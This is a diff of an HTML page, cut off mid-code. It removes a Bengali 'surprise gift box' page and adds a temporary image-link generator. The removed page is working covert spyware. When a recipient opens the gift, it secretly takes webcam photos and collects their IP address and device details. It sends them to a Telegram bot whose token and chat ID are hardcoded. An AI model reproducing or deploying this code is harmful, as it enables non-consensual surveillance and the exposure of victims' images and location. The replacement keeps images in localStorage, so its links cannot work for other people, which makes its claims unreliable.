@@ -1,392 +1,779 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ডিজিটাল সারপ্রাইজ বক্স</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Temporary Image Link Generator</title>
     <style>
-        :root {
-            --primary-color: #4A6CF7;
-            --primary-dark: #3A5CE5;
-            --secondary-color: #6C63FF;
-            --accent-color: #FF6B8B;
-            --background-gradient: linear-gradient(135deg, #f5f7fa 0%, #e4e8f5 100%);
-            --box-shadow: 0 15px 35px rgba(0, 0, 0, 0.08);
-            --text-dark: #2D3748;
-            --text-light: #718096;
-            --success-color: #10B981;
-            --border-radius: 12px;
-            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
-            --theme-primary: #4A6CF7;
-            --theme-secondary: #6C63FF;
-            --theme-gift-box: #4A6CF7;
-            --theme-gift-lid: #6C63FF;
-            --theme-ribbon: #FF6B8B;
-            --theme-background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f5 100%);
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-
-        /* Themes */
-        .theme-birthday { --theme-primary: #FF6B8B; --theme-secondary: #FF8FA3; --theme-gift-box: #FF6B8B; --theme-gift-lid: #FF8FA3; --theme-ribbon: #FFD166; --theme-background: linear-gradient(135deg, #ffeef2 0%, #ffd6df 100%); }
-        .theme-anniversary { --theme-primary: #D4AF37; --theme-secondary: #FFD700; --theme-gift-box: #D4AF37; --theme-gift-lid: #FFD700; --theme-ribbon: #FF6B8B; --theme-background: linear-gradient(135deg, #fff9e6 0%, #ffefbf 100%); }
-        .theme-newyear { --theme-primary: #10B981; --theme-secondary: #34D399; --theme-gift-box: #10B981; --theme-gift-lid: #34D399; --theme-ribbon: #FFD166; --theme-background: linear-gradient(135deg, #e6fff5 0%, #ccffeb 100%); }
-        .theme-proposal { --theme-primary: #EC4899; --theme-secondary: #F472B6; --theme-gift-box: #EC4899; --theme-gift-lid: #F472B6; --theme-ribbon: #C084FC; --theme-background: linear-gradient(135deg, #fdf2f8 0%, #fce7f3 100%); }
-
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Poppins', sans-serif; background: var(--theme-background); display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 15px; color: var(--text-dark); transition: background 0.5s ease; }
         
-        .container { background: white; padding: 25px; border-radius: var(--border-radius); box-shadow: var(--box-shadow); width: 100%; max-width: 500px; text-align: center; position: relative; margin-bottom: 20px; overflow: hidden; }
-        .container::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 5px; background: linear-gradient(to right, var(--theme-primary), var(--theme-secondary)); }
-
-        h1 { font-size: 22px; margin-bottom: 15px; color: var(--theme-primary); }
-        .hidden { display: none !important; }
-
-        /* Form Elements */
-        .form-group { text-align: left; margin-bottom: 15px; }
-        label { display: block; font-weight: 600; margin-bottom: 5px; font-size: 14px; }
-        input, textarea, select { width: 100%; padding: 12px; border: 1.5px solid #e2e8f0; border-radius: 8px; font-family: inherit; font-size: 15px; }
-        button { width: 100%; padding: 14px; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; transition: 0.3s; background: var(--theme-primary); color: white; }
-
-        /* Theme Selector */
-        .theme-selector { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 20px; justify-content: center; }
-        .theme-option { padding: 8px 12px; border: 2px solid #e2e8f0; border-radius: 8px; cursor: pointer; font-size: 13px; }
-        .theme-option.active { border-color: var(--theme-primary); background: #f0f4ff; color: var(--theme-primary); }
-
-        /* Dashboard Style */
-        #admin-dashboard { width: 100%; max-width: 500px; background: #1a202c; color: #48bb78; border-radius: 12px; padding: 20px; font-family: monospace; text-align: left; margin-top: 20px; display: none; }
-        .log-item { border-bottom: 1px solid #2d3748; padding: 10px 0; font-size: 12px; }
-        .log-img { width: 60px; height: 60px; object-fit: cover; margin-top: 5px; border: 1px solid #48bb78; }
-
-        /* Gift Box Styles (Original) */
-        .gift-wrapper { position: relative; width: 200px; height: 200px; margin: 20px auto; cursor: pointer; }
-        .gift-box { width: 100%; height: 100%; position: relative; animation: float 3s infinite; }
-        .box-body { width: 150px; height: 150px; background: var(--theme-gift-box); position: absolute; bottom: 0; left: 25px; border-radius: 8px; }
-        .lid { width: 160px; height: 40px; background: var(--theme-gift-lid); position: absolute; top: 10px; left: 20px; z-index: 2; transition: 1s; border-radius: 5px; }
-        .gift-box.open .lid { transform: translateY(-50px) rotate(-10deg); opacity: 0; }
-        .gift-box.open { animation: scaleDown 1s forwards; }
-
-        /* Typewriter & Message */
-        .message-container { background: #f8fafc; padding: 20px; border-radius: 10px; border-left: 5px solid var(--theme-primary); margin-top: 20px; opacity: 0; text-align: left; }
-        .message-container.show { opacity: 1; transition: 1s; }
-        .typewriter { font-family: monospace; font-size: 16px; white-space: pre-wrap; }
-
-        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
-        @keyframes scaleDown { 100% { transform: scale(0); opacity: 0; } }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
         
-        .victory-effect { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 999; }
+        .container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            padding: 40px;
+            width: 100%;
+            max-width: 600px;
+        }
+        
+        h1 {
+            color: #333;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 28px;
+        }
+        
+        .upload-area {
+            border: 3px dashed #667eea;
+            border-radius: 10px;
+            padding: 40px 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 30px;
+        }
+        
+        .upload-area:hover {
+            background: #f9f9f9;
+            border-color: #764ba2;
+        }
+        
+        .upload-area i {
+            font-size: 60px;
+            color: #667eea;
+            margin-bottom: 15px;
+        }
+        
+        .upload-area p {
+            color: #666;
+            margin: 10px 0;
+        }
+        
+        #fileInput {
+            display: none;
+        }
+        
+        .preview-container {
+            display: none;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        #imagePreview {
+            max-width: 100%;
+            max-height: 300px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+        
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .message {
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            text-align: center;
+            display: none;
+        }
+        
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .link-container {
+            display: none;
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border-left: 4px solid #667eea;
+        }
+        
+        .link-container h3 {
+            color: #333;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .link-box {
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            border: 2px dashed #dee2e6;
+            margin: 10px 0;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 14px;
+        }
+        
+        .btn-copy {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .btn-copy:hover {
+            background: #218838;
+        }
+        
+        .copy-success {
+            color: #28a745;
+            font-size: 12px;
+            margin-left: 10px;
+            display: none;
+        }
+        
+        .link-info {
+            font-size: 12px;
+            color: #6c757d;
+            margin-top: 5px;
+        }
+        
+        .step {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .step-number {
+            background: #667eea;
+            color: white;
+            width: 25px;
+            height: 25px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 10px;
+            font-weight: bold;
+        }
+        
+        .viewer-container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            padding: 40px;
+            width: 100%;
+            max-width: 600px;
+            text-align: center;
+        }
+        
+        #imageDisplay {
+            max-width: 100%;
+            max-height: 400px;
+            border-radius: 10px;
+            margin: 20px 0;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+        }
+        
+        .countdown-display {
+            font-size: 18px;
+            color: #333;
+            margin: 20px 0;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            display: inline-block;
+        }
+        
+        .countdown-warning {
+            color: #dc3545;
+            font-weight: bold;
+        }
+        
+        .expired-message {
+            color: #dc3545;
+            font-size: 20px;
+            margin: 30px 0;
+        }
+        
+        .viewer-info {
+            color: #6c757d;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        
+        .telegram-info {
+            background: #e3f2fd;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #1565c0;
+            text-align: center;
+        }
+        
+        .telegram-info a {
+            color: #0d47a1;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        
+        .telegram-info a:hover {
+            text-decoration: underline;
+        }
     </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-
-    <!-- ১. মূল ফর্ম (Sender View) -->
-    <div class="container" id="form-container">
-        <h1>🎁 ডিজিটাল সারপ্রাইজ বক্স</h1>
-        
-        <div class="theme-selector">
-            <div class="theme-option active" data-theme="birthday">জন্মদিন</div>
-            <div class="theme-option" data-theme="anniversary">বার্ষিকী</div>
-            <div class="theme-option" data-theme="newyear">নতুন বছর</div>
-            <div class="theme-option" data-theme="proposal">প্রপোজাল</div>
-            <div class="theme-option" data-theme="custom">কাস্টম</div>
-        </div>
-
-        <form id="giftForm">
-            <div class="form-group"><label>আপনার নাম:</label><input type="text" id="senderName" required></div>
-            <div class="form-group"><label>প্রাপকের নাম:</label><input type="text" id="receiverName" required></div>
-            <div class="form-group"><label>বার্তা:</label><textarea id="message" rows="3" required></textarea></div>
+    <div id="mainApp">
+        <div class="container">
+            <h1><i class="fas fa-image"></i> Temporary Image Link Generator</h1>
             
-            <div class="form-group">
-                <label>ছবি বা GIF URL (গ্যালারি থেকে নিতে পারেন):</label>
-                <input type="url" id="imageURL">
-                <div id="quick-gallery" style="margin-top: 10px; display: flex; gap: 5px; overflow-x: auto; padding-bottom: 5px;">
-                    <!-- JS will fill this -->
+            <div class="upload-area" id="uploadArea">
+                <i class="fas fa-cloud-upload-alt"></i>
+                <p>Click here or drag and drop to upload image</p>
+                <p><small>Supports: JPG, PNG, GIF, WebP (Max 5MB)</small></p>
+                <input type="file" id="fileInput" accept="image/*">
+            </div>
+            
+            <div class="preview-container" id="previewContainer">
+                <h3>Preview:</h3>
+                <img id="imagePreview" alt="Image Preview">
+            </div>
+            
+            <div class="loading" id="loading">
+                <div class="loading-spinner"></div>
+                <p>Generating temporary link...</p>
+            </div>
+            
+            <div class="message" id="message"></div>
+            
+            <div class="link-container" id="linkContainer">
+                <h3><i class="fas fa-link"></i> Temporary Image Link</h3>
+                <div class="link-box" id="linkBox">
+                    Loading link...
+                </div>
+                <p class="link-info">
+                    <i class="fas fa-exclamation-circle"></i> This link will expire 1 minute after opening
+                </p>
+                <button class="btn-copy" id="copyBtn">
+                    <i class="far fa-copy"></i> Copy Link
+                </button>
+                <span class="copy-success" id="copySuccess">Copied!</span>
+            </div>
+            
+            <button class="btn" id="sendBtn" disabled>
+                <i class="fas fa-link"></i> Generate Temporary Link
+            </button>
+            
+            <div class="telegram-info">
+                <h3><i class="fab fa-telegram"></i> Want to send to Telegram?</h3>
+                <p>Manually send the image to your Telegram bot:</p>
+                <p>1. Open <a href="https://t.me/YOUR_BOT_USERNAME" target="_blank">Telegram Bot</a></p>
+                <p>2. Send the image directly to the bot</p>
+                <p>3. Share the temporary link with others</p>
+            </div>
+            
+            <div class="info-box">
+                <h3><i class="fas fa-info-circle"></i> How it works:</h3>
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <div>Upload an image using the upload area</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div>Click "Generate Temporary Link" button</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div>Copy the temporary link (expires 1 minute after opening)</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">4</div>
+                    <div>Anyone can view the image for 1 minute after opening the link</div>
                 </div>
             </div>
-
-            <div class="form-group" style="background: #f1f5f9; padding: 10px; border-radius: 8px;">
-                <label style="display:flex; align-items:center; gap:8px;">
-                    <input type="checkbox" id="enableCountdown"> কাউন্টডাউন টাইমার
-                </label>
-                <input type="datetime-local" id="countdownDateTime" class="hidden" style="margin-top:10px;">
-            </div>
-
-            <div class="form-group">
-                <label><input type="checkbox" id="enableCamera" checked> ক্যামেরা ছবি তুলবে</label>
-                <label><input type="checkbox" id="enableInfo" checked> ডিভাইস তথ্য নিবে</label>
-            </div>
-
-            <button type="submit">গিফট লিঙ্ক তৈরি করুন</button>
-        </form>
-
-        <div id="linkContainer" class="hidden" style="margin-top:20px; padding:15px; background:#eef2ff; border-radius:8px;">
-            <p style="font-size:12px; margin-bottom:5px;">আপনার লিঙ্কটি কপি করুন:</p>
-            <input type="text" id="finalLink" readonly>
-            <button id="copyBtn" style="margin-top:10px; background:#10B981;">কপি করুন</button>
-        </div>
-
-        <button id="showLogsBtn" style="margin-top:20px; background:#4A5568;">View Activity Log (Dashboard)</button>
-    </div>
-
-    <!-- ২. এডমিন ড্যাশবোর্ড (এটি শুধুমাত্র মূল পেজে থাকবে) -->
-    <div id="admin-dashboard">
-        <h3><i class="fas fa-database"></i> Admin Dashboard</h3>
-        <p style="font-size:10px; color:#888;">(এখানে রিসিভারের তথ্যগুলো দেখা যাবে)</p>
-        <div id="log-list">
-            <p id="no-log">এখনো কোনো ডাটা নেই...</p>
         </div>
     </div>
-
-    <!-- ৩. গিফট বক্স (Receiver View) -->
-    <div class="container hidden" id="gift-container">
-        <h2 id="receiverDisplay"></h2>
-        <div id="timerDisplay" class="hidden" style="font-size:24px; font-weight:700; color:red; margin:20px 0;"></div>
-        
-        <div id="gift-content-main">
-            <h3 id="themeTitle"></h3>
-            <div class="gift-wrapper" id="giftWrapper">
-                <div class="gift-box" id="giftBox">
-                    <div class="lid"></div><div class="box-body"></div>
-                </div>
-                <div id="revealed-content" class="hidden">
-                    <img id="giftImage" src="" style="max-width:100%; border-radius:10px; margin-bottom:15px;">
-                </div>
-            </div>
-            <p id="clickHint">বক্সে ক্লিক করো!</p>
-        </div>
-    </div>
-
-    <div class="victory-effect" id="victoryEffect"></div>
-    <video id="video" style="display:none" playsinline></video>
-    <canvas id="canvas" style="display:none"></canvas>
 
     <script>
-        const TELEGRAM_BOT = "7247057741:AAHZHI2n1KuXnWNSiAcA-B0WcCI8LuPWdhk";
-        const CHAT_ID = "2139008203";
+        // Configuration
+        const IMAGE_EXPIRY_MINUTES = 1; // লিংক ওপেন করার পর 1 মিনিট
 
-        const sampleGifs = [
-            "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/gif-1.gif",
-            "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/gif-2.gif",
-            "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/gif-3.gif"
-        ];
+        // DOM Elements
+        const mainApp = document.getElementById('mainApp');
+        const uploadArea = document.getElementById('uploadArea');
+        const fileInput = document.getElementById('fileInput');
+        const imagePreview = document.getElementById('imagePreview');
+        const previewContainer = document.getElementById('previewContainer');
+        const sendBtn = document.getElementById('sendBtn');
+        const loading = document.getElementById('loading');
+        const message = document.getElementById('message');
+        const linkContainer = document.getElementById('linkContainer');
+        const linkBox = document.getElementById('linkBox');
+        const copyBtn = document.getElementById('copyBtn');
+        const copySuccess = document.getElementById('copySuccess');
 
-        // --- ড্যাশবোর্ড লজিক ---
-        function saveToWebLog(type, data, isImg = false) {
-            const list = document.getElementById('log-list');
-            const noLog = document.getElementById('no-log');
-            if(noLog) noLog.remove();
+        let selectedFile = null;
+        let currentLink = '';
 
-            const item = document.createElement('div');
-            item.className = 'log-item';
-            if(isImg) {
-                item.innerHTML = `<strong>[${type}]</strong><br><img src="${data}" class="log-img">`;
-            } else {
-                item.innerHTML = `<strong>[${type}]</strong>: ${data}`;
-            }
-            list.prepend(item);
+        // Check if we're in viewer mode
+        function checkViewerMode() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const imageId = urlParams.get('view');
             
-            // LocalStorage এ সেভ করা (একই ব্রাউজারে টেস্ট করলে কাজে লাগবে)
-            let logs = JSON.parse(localStorage.getItem('giftLogs') || '[]');
-            logs.push({type, data, isImg, time: new Date().toLocaleTimeString()});
-            localStorage.setItem('giftLogs', JSON.stringify(logs));
+            if (imageId) {
+                // We're in viewer mode - show the image
+                showImageViewer(imageId);
+                return true;
+            }
+            return false;
         }
 
-        // পেজ লোড হলে আগের লগ দেখানো
-        window.onload = () => {
-            let logs = JSON.parse(localStorage.getItem('giftLogs') || '[]');
-            logs.reverse().forEach(l => {
-                const noLog = document.getElementById('no-log');
-                if(noLog) noLog.remove();
-                const item = document.createElement('div');
-                item.className = 'log-item';
-                item.innerHTML = l.isImg ? `<strong>[${l.type}]</strong><br><img src="${l.data}" class="log-img">` : `<strong>[${l.type}]</strong>: ${l.data}`;
-                document.getElementById('log-list').appendChild(item);
-            });
-        };
-
-        // --- গ্যালারি সেটআপ ---
-        const gallery = document.getElementById('quick-gallery');
-        sampleGifs.forEach(url => {
-            const img = document.createElement('img');
-            img.src = url;
-            img.style.width = "50px"; img.style.height = "50px"; img.style.cursor="pointer"; img.style.borderRadius="5px";
-            img.onclick = () => document.getElementById('imageURL').value = url;
-            gallery.appendChild(img);
-        });
-
-        // --- থিম সিলেকশন ---
-        document.querySelectorAll('.theme-option').forEach(opt => {
-            opt.onclick = () => {
-                document.querySelector('.theme-option.active').classList.remove('active');
-                opt.classList.add('active');
-                document.body.className = 'theme-' + opt.dataset.theme;
-            };
-        });
-
-        // কাউন্টডাউন ইনপুট শো/হাইড
-        document.getElementById('enableCountdown').onchange = (e) => {
-            document.getElementById('countdownDateTime').classList.toggle('hidden', !e.target.checked);
-        };
-
-        // --- লিঙ্ক তৈরি ---
-        document.getElementById('giftForm').onsubmit = (e) => {
-            e.preventDefault();
-            const params = new URLSearchParams({
-                sender: document.getElementById('senderName').value,
-                receiver: document.getElementById('receiverName').value,
-                msg: document.getElementById('message').value,
-                img: document.getElementById('imageURL').value,
-                theme: document.querySelector('.theme-option.active').dataset.theme,
-                cd: document.getElementById('enableCountdown').checked ? document.getElementById('countdownDateTime').value : '',
-                cam: document.getElementById('enableCamera').checked,
-                info: document.getElementById('enableInfo').checked
-            });
-            const finalLink = window.location.href.split('?')[0] + '?' + params.toString();
-            document.getElementById('finalLink').value = finalLink;
-            document.getElementById('linkContainer').classList.remove('hidden');
-        };
-
-        document.getElementById('copyBtn').onclick = () => {
-            document.getElementById('finalLink').select();
-            document.execCommand('copy');
-            alert('লিঙ্ক কপি হয়েছে!');
-        };
-
-        document.getElementById('showLogsBtn').onclick = () => {
-            const dash = document.getElementById('admin-dashboard');
-            dash.style.display = dash.style.display === 'block' ? 'none' : 'block';
-        };
-
-        // --- রিসিভার সাইড লজিক ---
-        const urlParams = new URLSearchParams(window.location.search);
-        if(urlParams.has('sender')) {
-            document.getElementById('form-container').classList.add('hidden');
-            document.getElementById('gift-container').classList.remove('hidden');
+        // Show image viewer
+        function showImageViewer(imageId) {
+            // Clear the main app
+            mainApp.innerHTML = '';
             
-            const receiver = urlParams.get('receiver');
-            const cdTime = urlParams.get('cd');
-            document.getElementById('receiverDisplay').innerText = "প্রিয় " + receiver;
-            document.body.className = 'theme-' + urlParams.get('theme');
+            // Try to get image data from localStorage
+            const imageKey = `temp_image_${imageId}`;
+            const storedData = localStorage.getItem(imageKey);
+            
+            if (!storedData) {
+                showExpiredMessage();
+                return;
+            }
+            
+            try {
+                const imageData = JSON.parse(storedData);
+                
+                // Check if this is the first time viewing
+                let viewStartTime = imageData.viewStartTime;
+                let isFirstView = false;
+                
+                if (!viewStartTime) {
+                    // First time viewing - set view start time
+                    isFirstView = true;
+                    imageData.viewStartTime = Date.now();
+                    localStorage.setItem(imageKey, JSON.stringify(imageData));
+                    viewStartTime = imageData.viewStartTime;
+                }
+                
+                // Calculate expiry time
+                const expiryTime = viewStartTime + (IMAGE_EXPIRY_MINUTES * 60 * 1000);
+                const timeLeft = expiryTime - Date.now();
+                
+                if (timeLeft <= 0) {
+                    // Image has expired
+                    localStorage.removeItem(imageKey);
+                    showExpiredMessage();
+                    return;
+                }
+                
+                // Create viewer interface
+                const viewerHTML = `
+                    <div class="viewer-container">
+                        <h1><i class="fas fa-image"></i> Temporary Image Viewer</h1>
+                        
+                        <div id="imageContainer">
+                            <img id="imageDisplay" 
+                                 src="data:${imageData.mimeType};base64,${imageData.image}" 
+                                 alt="Temporary Image">
+                        </div>
+                        
+                        <div class="countdown-display" id="countdownDisplay">
+                            <i class="fas fa-clock"></i> Image will expire in: 
+                            <span id="countdownTimer">01:00</span>
+                        </div>
+                        
+                        <p class="viewer-info">
+                            <i class="fas fa-info-circle"></i> 
+                            This image will automatically disappear in 1 minute
+                        </p>
+                        
+                        <button class="btn" onclick="window.location.href='./'">
+                            <i class="fas fa-arrow-left"></i> Back to Upload
+                        </button>
+                    </div>
+                `;
+                
+                mainApp.innerHTML = viewerHTML;
+                
+                // Start countdown
+                startViewerCountdown(expiryTime, imageId);
+                
+            } catch (error) {
+                console.error('Error loading image:', error);
+                showExpiredMessage();
+            }
+        }
 
-            if(cdTime && new Date(cdTime) > new Date()) {
-                document.getElementById('gift-content-main').classList.add('hidden');
-                document.getElementById('timerDisplay').classList.remove('hidden');
-                const timer = setInterval(() => {
-                    const diff = new Date(cdTime) - new Date();
-                    if(diff <= 0) {
-                        clearInterval(timer);
-                        location.reload();
+        // Start countdown for viewer
+        function startViewerCountdown(expiryTime, imageId) {
+            const updateCountdown = () => {
+                const now = Date.now();
+                const timeLeft = expiryTime - now;
+                
+                if (timeLeft <= 0) {
+                    // Time's up - remove image and show expired message
+                    localStorage.removeItem(`temp_image_${imageId}`);
+                    
+                    const countdownElement = document.getElementById('countdownTimer');
+                    if (countdownElement) {
+                        countdownElement.textContent = '00:00';
                     }
-                    const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
-                    document.getElementById('timerDisplay').innerText = `আনলক হবে: ${h}h ${m}m ${s}s`;
-                }, 1000);
-            } else {
-                startGiftExperience();
-            }
-        }
-
-        function startGiftExperience() {
-            const giftWrapper = document.getElementById('giftWrapper');
-            giftWrapper.onclick = async () => {
-                giftWrapper.onclick = null;
-                document.getElementById('giftBox').classList.add('open');
-                document.getElementById('clickHint').innerText = "খুলছে...";
-
-                // ডাটা কালেকশন (Web Log + Telegram)
-                if(urlParams.get('info') === 'true') fetchInfo();
-                if(urlParams.get('cam') === 'true') capturePhotos();
-
-                setTimeout(() => {
-                    document.getElementById('giftBox').classList.add('hidden');
-                    document.getElementById('revealed-content').classList.remove('hidden');
-                    document.getElementById('clickHint').classList.add('hidden');
-                    if(urlParams.get('img')) document.getElementById('giftImage').src = urlParams.get('img');
                     
-                    showMessage();
-                    triggerVictory();
-                }, 1500);
+                    setTimeout(() => {
+                        showExpiredMessage();
+                    }, 1000);
+                    
+                    return;
+                }
+                
+                // Calculate minutes and seconds
+                const minutes = Math.floor(timeLeft / 60000);
+                const seconds = Math.floor((timeLeft % 60000) / 1000);
+                
+                // Format as MM:SS
+                const formattedTime = 
+                    minutes.toString().padStart(2, '0') + ':' + 
+                    seconds.toString().padStart(2, '0');
+                
+                // Update display
+                const countdownElement = document.getElementById('countdownTimer');
+                if (countdownElement) {
+                    countdownElement.textContent = formattedTime;
+                    
+                    // Change color when less than 10 seconds
+                    if (timeLeft < 10000) {
+                        countdownElement.style.color = '#dc3545';
+                        countdownElement.classList.add('countdown-warning');
+                    }
+                }
             };
+            
+            // Update immediately
+            updateCountdown();
+            
+            // Update every second
+            const countdownInterval = setInterval(updateCountdown, 1000);
+            
+            // Store interval ID to clear if needed
+            window.viewerCountdownInterval = countdownInterval;
         }
 
-        function showMessage() {
-            const container = document.createElement('div');
-            container.className = 'message-container show';
-            const text = document.createElement('div');
-            text.className = 'typewriter';
-            container.innerHTML = `<h4>${urlParams.get('sender')} এর বার্তা:</h4>`;
-            container.appendChild(text);
-            document.getElementById('gift-container').appendChild(container);
-
-            let i = 0;
-            const msg = urlParams.get('msg');
-            function type() {
-                if(i < msg.length) {
-                    text.innerHTML += msg.charAt(i);
-                    i++;
-                    setTimeout(type, 50);
-                }
-            }
-            type();
-        }
-
-        async function fetchInfo() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                const info = `IP: ${data.ip}\nPlatform: ${navigator.platform}\nTime: ${new Date().toLocaleString()}`;
-                
-                // ১. টেলিগ্রামে
-                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage?chat_id=${CHAT_ID}&text=🎁 বক্স খোলা হয়েছে!\n${info}`);
-                
-                // ২. ওয়েব লগে
-                saveToWebLog("DEVICE INFO", info);
-            } catch(e) { saveToWebLog("ERROR", "Info fetch failed"); }
-        }
-
-        async function capturePhotos() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({video: true});
-                document.getElementById('video').srcObject = stream;
-                await document.getElementById('video').play();
-                
-                for(let i=0; i<3; i++) {
-                    await new Promise(r => setTimeout(r, 1000));
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = 400; canvas.height = 300;
-                    canvas.getContext('2d').drawImage(document.getElementById('video'), 0, 0, 400, 300);
-                    const imgData = canvas.toDataURL('image/jpeg');
+        // Show expired message
+        function showExpiredMessage() {
+            mainApp.innerHTML = `
+                <div class="viewer-container">
+                    <h1><i class="fas fa-clock"></i> Image Expired</h1>
                     
-                    // ১. ওয়েব লগে সেভ
-                    saveToWebLog(`PHOTO ${i+1}`, imgData, true);
-
-                    // ২. টেলিগ্রামে সেন্ড
-                    canvas.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('chat_id', CHAT_ID);
-                        fd.append('photo', blob, 'pic.jpg');
-                        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendPhoto`, {method:'POST', body:fd});
-                    }, 'image/jpeg');
-                }
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) { saveToWebLog("CAMERA ERROR", "Permission denied"); }
+                    <div class="expired-message">
+                        <i class="fas fa-exclamation-triangle" style="font-size: 60px;"></i>
+                        <p style="margin-top: 20px;">This image link has expired</p>
+                    </div>
+                    
+                    <p class="viewer-info">
+                        The temporary image link was only valid for 1 minute after opening.
+                    </p>
+                    
+                    <button class="btn" onclick="window.location.href='./'">
+                        <i class="fas fa-arrow-left"></i> Back to Upload
+                    </button>
+                </div>
+            `;
         }
 
-        function triggerVictory() {
-            const effect = document.getElementById('victoryEffect');
-            for(let i=0; i<50; i++) {
-                const p = document.createElement('div');
-                p.style.position = 'absolute';
-                p.style.width = '10px'; p.style.height = '10px';
-                p.style.background = `hsl(${Math.random()*360}, 100%, 50%)`;
-                p.style.left = Math.random()*100 + '%';
-                p.style.top = '-10px';
-                p.style.borderRadius = '50%';
-                effect.appendChild(p);
-                p.animate([{transform: 'translateY(0)'}, {transform: `translateY(${window.innerHeight}px) rotate(360deg)`}], {duration: 2000+Math.random()*3000, iterations: 1});
+        // Event Listeners
+        uploadArea.addEventListener('click', () => fileInput.click());
+        uploadArea.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            uploadArea.style.borderColor = '#764ba2';
+            uploadArea.style.background = '#f0f0f0';
+        });
+        uploadArea.addEventListener('dragleave', () => {
+            uploadArea.style.borderColor = '#667eea';
+            uploadArea.style.background = '';
+        });
+        uploadArea.addEventListener('drop', (e) => {
+            e.preventDefault();
